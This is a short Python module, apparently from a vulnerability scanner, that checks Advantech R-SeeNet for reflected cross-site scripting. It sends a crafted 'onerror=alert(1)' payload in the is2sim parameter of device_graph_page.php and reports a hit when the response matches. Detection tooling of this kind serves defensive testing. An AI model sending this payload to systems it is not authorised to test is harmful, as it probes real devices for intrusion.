#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Advantech R-SeeNet is vulnerable to cross-site scripting via the device_graph_page."""
...
class Module(Scanner, Http_client):
    ...
    def run(self):
        r = self.http_request(method="GET", path='/php/device_graph_page.php?is2sim=%22zlo%20onerror=alert(1)%20%22', allow_redirects=False)
        ...
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                ...
                path='/php/device_graph_page.php?is2sim=%22zlo%20onerror=alert(1)%20%22',
            )
            return True
        return False
